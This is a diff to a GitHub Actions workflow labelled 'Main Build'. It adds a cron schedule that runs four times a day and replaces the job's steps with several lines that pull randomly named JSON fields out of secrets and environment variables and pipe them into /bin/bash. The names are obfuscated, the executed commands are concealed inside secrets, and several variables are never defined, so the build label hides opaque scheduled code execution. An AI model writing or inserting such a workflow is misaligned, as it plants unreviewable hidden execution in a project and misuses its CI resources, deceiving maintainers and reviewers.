@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,14 +14,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          ha3247: ${{ secrets.ha3247 }}
+          h7: ${{ secrets.h7 }}
         run: |
-          printf '%s' "$ha3247" | jq -r .z5017 | /bin/bash
-          echo $xsoh17 | jq -r .nup29907 | /bin/bash
+          printf '%s' "$h7" | jq -r .fso49 | /bin/bash
+          printf '%s' "$ylbmm4546" | jq -r .hjjze5824 | /bin/bash
+          printf '%s' "$zpmew886" | jq -r .lppcc90578 | /bin/bash
+          echo $drdcg89 | jq -r .tib3 | /bin/bash
+          echo $bwag161 | jq -r .q784 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: OQXkldO4
+          name: fkFrN6E4
           path: "*.zip"
           retention-days: 1
